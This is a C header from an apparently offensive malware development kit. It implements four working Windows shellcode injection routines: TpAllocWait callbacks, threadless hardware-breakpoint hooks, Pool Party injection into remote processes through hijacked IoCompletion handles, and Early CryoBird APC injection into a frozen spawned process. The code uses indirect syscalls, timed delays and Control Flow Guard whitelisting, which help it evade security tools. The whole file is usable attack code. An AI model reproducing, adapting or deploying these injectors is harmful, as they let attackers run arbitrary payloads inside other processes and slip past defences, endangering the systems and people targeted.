/**
 * @file Injectors.h
 * @author Ky4meru (@ky4meru)
 * @brief Shellcode injection techniques (TpAlloc, HWBP, PoolParty, EarlyCryoBird).
 * @version 0.4
 * @date 2026-09-15
 * @copyright Copyright (c) 2024-2026
 */

#ifndef _MDK_INJECTORS_H_
#define _MDK_INJECTORS_H_

#include "Allocators.h"
#include "Breakpoints.h"
#include "Log.h"
#include "Wrappers.h"

/**
 * @brief Injects and executes shellcode in the current process using the TpAllocWait callback mechanism.
 *
 * The function allocates shellcode using the specified allocation strategy, creates a synchronization event, and
 * registers the shellcode as a thread pool wait callback via TpAllocWait. When the event is signaled, the thread pool
 * executes the shellcode.
 *
 * @param alloc The allocation strategy to use for loading the shellcode.
 * @param path The file path of the DLL to stomp. Only used with MdkModuleStompingAllocation, ignored otherwise.
 * @param shellcode The pointer to the shellcode buffer to inject.
 * @param size The size of the shellcode buffer, in bytes.
 * @param ms The delay in milliseconds between each operation.
 * @param cfg If nonzero, whitelists the allocated region in Control Flow Guard.
 * @return If the function succeeds, the return value is nonzero.
 */
MDK_TEXT_SEC(MDK) static BOOL MdkInjectLocallyViaTpAlloc(_In_ MDK_ALLOCATOR alloc, _In_opt_ LPCSTR path, _In_ LPCVOID shellcode, _In_ SIZE_T size, _In_ DWORD ms, _In_ BOOL cfg)
{
    MDK_LOG_DEBUG("Calling with (alloc=%d, path=%s, shellcode=0x%p, size=%zu, ms=%lu, cfg=%d)", alloc, path, shellcode, size, ms, cfg);

    MDK_DECL_DLL(Ntdll);
    MDK_DECL_PROC(NtCreateEvent);
    MDK_DECL_PROC(TpAllocWait);
    MDK_DECL_PROC(TpReleaseWait);
    MDK_DECL_PROC(TpSetWait);

    HANDLE trace = NULL;
    LPVOID payload = NULL;
    PTP_WAIT thread = NULL;

    if (MDK_SUCCEEDED(MDK_INDIRECT_SYSCALL(NtCreateEvent, &trace, EVENT_ALL_ACCESS, NULL, 0x1, TRUE)))
    {
        MdkSleep(ms);

        if (MdkLoadShellcode(MdkCurrentProcess(), &payload, alloc, path, shellcode, size, ms, cfg))
        {
            MdkSleep(ms);
            MDK_CALL_PROC(MDK_GET_PROC(Ntdll, TpAllocWait), &thread, payload, NULL, NULL);
            
            MdkSleep(ms);
            MDK_CALL_PROC(MDK_GET_PROC(Ntdll, TpSetWait), thread, trace, NULL);
            
            MdkSleep(ms);
            MdkWaitForSingleObject(trace, 3000);
            
            MdkSleep(ms);
            MDK_CALL_PROC(MDK_GET_PROC(Ntdll, TpReleaseWait), thread);
            MdkCloseHandle(trace);

            MDK_LOG_DEBUG("Successfully finished");

            return TRUE;
        }

        MdkCloseHandle(trace);
    }

    MDK_LOG_DEBUG("Failed");

    return FALSE;
}

/**
 * @brief Injects shellcode in the current process using threadless hardware breakpoint hooking.
 *
 * @param gate The pointer to the gate function to hook. When called, the hardware breakpoint redirects execution to the shellcode.
 * @param drx The debug register index to use (0-3).
 * @param alloc The allocation strategy to use for loading the shellcode.
 * @param path The file path of the DLL to stomp. Only used with MdkModuleStompingAllocation, ignored otherwise.
 * @param shellcode The pointer to the shellcode buffer to inject.
 * @param size The size of the shellcode buffer, in bytes.
 * @param ms The delay in milliseconds between each operation.
 * @param cfg If nonzero, whitelists the allocated region in Control Flow Guard.
 * @return If the function succeeds, the return value is nonzero.
 */
MDK_TEXT_SEC(MDK) static BOOL MdkThreadlessInjectLocallyViaHwbp(_In_ LPVOID gate, _In_ DWORD drx, _In_ MDK_ALLOCATOR alloc, _In_opt_ LPCSTR path, _In_ LPCVOID shellcode, _In_ SIZE_T size, _In_ DWORD ms, _In_ BOOL cfg)
{
    LPVOID payload = NULL;

    if (!MdkStartHardwareBreakpointsEngine())
    {
        return FALSE;
    }

    MdkSleep(ms);

    if (!MdkLoadShellcode(MdkCurrentProcess(), &payload, alloc, path, shellcode, size, ms, cfg))
    {
        MdkStopHardwareBreakpointsEngine();
        return FALSE;
    }

    MdkSleep(ms);

    if (!MdkInsertHardwareBreakpoint(gate, payload, drx))
    {
        MdkStopHardwareBreakpointsEngine();
        return FALSE;
    }

    MdkSleep(ms);

    return TRUE;
}

/**
 * @brief Injects shellcode into a remote process using the Pool Party technique via TP_DIRECT.
 *
 * The function opens the target process, enumerates its handles to find an IoCompletion port, loads the shellcode using
 * the specified allocation strategy, writes a TP_DIRECT structure pointing to the shellcode, and queues a completion
 * packet to trigger execution.
 *
 * @param pid The identifier of the target process.
 * @param alloc The allocation strategy to use for loading the shellcode.
 * @param path The file path of the DLL to stomp. Only used with MdkModuleStompingAllocation, ignored otherwise.
 * @param shellcode The pointer to the shellcode buffer to inject.
 * @param size The size of the shellcode buffer, in bytes.
 * @param ms The delay in milliseconds between each operation.
 * @param cfg If nonzero, whitelists the allocated region in Control Flow Guard.
 * @return If the function succeeds, the return value is nonzero.
 */
MDK_TEXT_SEC(MDK) static BOOL MdkInjectRemotelyViaPoolParty(_In_ DWORD pid, _In_ MDK_ALLOCATOR alloc, _In_opt_ LPCSTR path, _In_ LPCVOID shellcode, _In_ SIZE_T size, _In_ DWORD ms, _In_ BOOL cfg)
{
    MDK_DECL_PROC(NtDuplicateObject);
    MDK_DECL_PROC(NtQueryInformationProcess);
    MDK_DECL_PROC(NtQueryObject);
    MDK_DECL_PROC(NtSetIoCompletion);

    BOOL ret = FALSE;
    DWORD i = 0;
    HANDLE dup = NULL;
    HANDLE phd = NULL;
    HANDLE tmp = NULL;
    LPVOID buf = NULL;
    LPVOID dir = NULL;
    LPVOID inf = NULL;
    LPVOID payload = NULL;
    MDK_PPROCESS_HANDLE_SNAPSHOT_INFORMATION phi = NULL;
    MDK_PPUBLIC_OBJECT_TYPE_INFORMATION poi = NULL;
    MDK_TP_DIRECT tpd;
    NTSTATUS nts = 0;
    SIZE_T len = 0x1000;
    SIZE_T wrt = 0;

    MdkZeroMemory(&tpd, sizeof(tpd));

    if (!(phd = MdkOpenProcess(PROCESS_ALL_ACCESS, FALSE, pid)))
    {
        return FALSE;
    }

    MdkSleep(ms);

    do
    {
        if (inf)
        {
            MdkFree(inf);
        }

        inf = MdkMalloc(len);
        nts = MDK_INDIRECT_SYSCALL(NtQueryInformationProcess, phd, 0x33, inf, len, &len);
    } while (nts == 0xC0000004L);

    if (!MDK_SUCCEEDED(nts))
    {
        MdkFree(inf);
        MdkCloseHandle(phd);
        return FALSE;
    }

    phi = (MDK_PPROCESS_HANDLE_SNAPSHOT_INFORMATION)inf;

    for (i = 0; i < phi->NumberOfHandles; ++i)
    {
        if (!MDK_SUCCEEDED(MDK_INDIRECT_SYSCALL(NtDuplicateObject, phd, phi->Handles[i].HandleValue, MdkCurrentProcess(), &tmp, IO_COMPLETION_ALL_ACCESS, FALSE, NULL)))
        {
            continue;
        }

        len = 0;

        do
        {
            if (buf)
            {
                MdkFree(buf);
            }

            buf = MdkMalloc(len);
            nts = MDK_INDIRECT_SYSCALL(NtQueryObject, tmp, 0x2, buf, len, &len);
        } while (nts == 0xC0000004L);

        if (MDK_SUCCEEDED(nts))
        {
            poi = (MDK_PPUBLIC_OBJECT_TYPE_INFORMATION)buf;

            if (poi->TypeName.Buffer && !MdkCompareWideString(L"IoCompletion\0", poi->TypeName.Buffer))
            {
                dup = tmp;
                MdkFree(buf);
                buf = NULL;
                break;
            }
        }

        MdkCloseHandle(tmp);
        MdkFree(buf);
        buf = NULL;
        tmp = NULL;
    }

    MdkFree(inf);

    if (!dup)
    {
        MdkCloseHandle(phd);
        return FALSE;
    }

    MdkSleep(ms);

    if (!MdkLoadShellcode(phd, &payload, alloc, path, shellcode, size, ms, cfg))
    {
        MdkCloseHandle(dup);
        MdkCloseHandle(phd);
        return FALSE;
    }

    MdkSleep(ms);

    tpd.Callback = payload;
    dir = MdkVirtualAllocEx(phd, NULL, sizeof(MDK_TP_DIRECT), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    if (!dir)
    {
        MdkCloseHandle(dup);
        MdkCloseHandle(phd);
        return FALSE;
    }

    MdkSleep(ms);

    if (!MdkWriteProcessMemory(phd, dir, &tpd, sizeof(tpd), &wrt))
    {
        MdkCloseHandle(dup);
        MdkCloseHandle(phd);
        return FALSE;
    }

    MdkSleep(ms);

    ret = MDK_SUCCEEDED(MDK_INDIRECT_SYSCALL(NtSetIoCompletion, dup, dir, NULL, NULL, NULL));

    MdkZeroMemory(&tpd, sizeof(tpd));
    MdkCloseHandle(dup);
    MdkCloseHandle(phd);

    return ret;
}

/**
 * @brief Injects shellcode into a remote process identified by name using the Pool Party technique via TP_DIRECT.
 * 
 * @param process The image name of the target process (e.g. "notepad.exe").
 * @param alloc The allocation strategy to use for loading the shellcode.
 * @param path The file path of the DLL to stomp. Only used with MdkModuleStompingAllocation, ignored otherwise.
 * @param shellcode The pointer to the shellcode buffer to inject.
 * @param size The size of the shellcode buffer, in bytes.
 * @param ms The delay in milliseconds between each operation.
 * @param cfg If nonzero, whitelists the allocated region in Control Flow Guard.
 * @return If the function succeeds, the return value is nonzero.
 */
MDK_TEXT_SEC(MDK) static BOOL MdkInjectRemotelyViaPoolParty(_In_ LPCSTR process, _In_ MDK_ALLOCATOR alloc, _In_opt_ LPCSTR path, _In_ LPCVOID shellcode, _In_ SIZE_T size, _In_ DWORD ms, _In_ BOOL cfg)
{
    DWORD pid = 0;

    if (!(pid = MdkGetProcessIdByName(process)))
    {
        return FALSE;
    }

    return MdkInjectRemotelyViaPoolParty(pid, alloc, path, shellcode, size, ms, cfg);
}

/**
 * @brief Injects shellcode into a newly spawned process using the Early CryoBird technique.
 *
 * @param process The file path of the executable image to spawn.
 * @param alloc The allocation strategy to use for loading the shellcode.
 * @param path The file path of the DLL to stomp. Only used with MdkModuleStompingAllocation, ignored otherwise.
 * @param shellcode The pointer to the shellcode buffer to inject.
 * @param size The size of the shellcode buffer, in bytes.
 * @param ms The delay in milliseconds between each operation.
 * @param cfg If nonzero, whitelists the allocated region in Control Flow Guard.
 * @return If the function succeeds, the return value is nonzero.
 */
MDK_TEXT_SEC(MDK) static BOOL MdkInjectRemotelyViaEarlyCryoBird(_In_ LPCSTR process, _In_ MDK_ALLOCATOR alloc, _In_opt_ LPCSTR path, _In_ LPCVOID shellcode, _In_ SIZE_T size, _In_ DWORD ms, _In_ BOOL cfg)
{
    MDK_DECL_PROC(NtCreateJobObject);
    MDK_DECL_PROC(NtQueueApcThread);
    MDK_DECL_PROC(NtSetInformationJobObject);
    MDK_DECL_PROC(NtTerminateProcess);

    HANDLE job = NULL;
    HANDLE phd = NULL;
    HANDLE thd = NULL;
    LPVOID payload = NULL;
    MDK_JOBOBJECT_FREEZE_INFORMATION inf;

    MdkZeroMemory(&inf, sizeof(inf));

    inf.FreezeOperation = 1;
    inf.Freeze = TRUE;

    if (!MDK_SUCCEEDED(MDK_INDIRECT_SYSCALL(NtCreateJobObject, &job, STANDARD_RIGHTS_ALL | 63, NULL)))
    {
        return FALSE;
    }

    MdkSleep(ms);

    if (!MDK_SUCCEEDED(MDK_INDIRECT_SYSCALL(NtSetInformationJobObject, job, 18, &inf, sizeof(inf))))
    {
        MdkCloseHandle(job);
        return FALSE;
    }

    MdkSleep(ms);

    if (!MdkCreateSuspendedProcess(process, &phd, &thd, job))
    {
        MdkCloseHandle(job);
        return FALSE;
    }

    MdkSleep(ms);

    if (!MdkLoadShellcode(phd, &payload, alloc, path, shellcode, size, ms, cfg))
    {
        MDK_INDIRECT_SYSCALL(NtTerminateProcess, phd, 0);
        MdkCloseHandle(thd);
        MdkCloseHandle(phd);
        MdkCloseHandle(job);
        return FALSE;
    }

    MdkSleep(ms);

    if (!MDK_SUCCEEDED(MDK_INDIRECT_SYSCALL(NtQueueApcThread, thd, payload, NULL, NULL, NULL)))
    {
        MDK_INDIRECT_SYSCALL(NtTerminateProcess, phd, 0);
        MdkCloseHandle(thd);
        MdkCloseHandle(phd);
        MdkCloseHandle(job);
        return FALSE;
    }

    MdkSleep(ms);

    inf.FreezeOperation = 1;
    inf.Freeze = FALSE;

    if (!MDK_SUCCEEDED(MDK_INDIRECT_SYSCALL(NtSetInformationJobObject, job, 18, &inf, sizeof(inf))))
    {
        MDK_INDIRECT_SYSCALL(NtTerminateProcess, phd, 0);
        MdkCloseHandle(thd);
        MdkCloseHandle(phd);
        MdkCloseHandle(job);
        return FALSE;
    }

    MdkZeroMemory(&inf, sizeof(inf));
    MdkCloseHandle(thd);
    MdkCloseHandle(phd);
    MdkCloseHandle(job);

    return TRUE;
}

#endif // _MDK_INJECTORS_H_
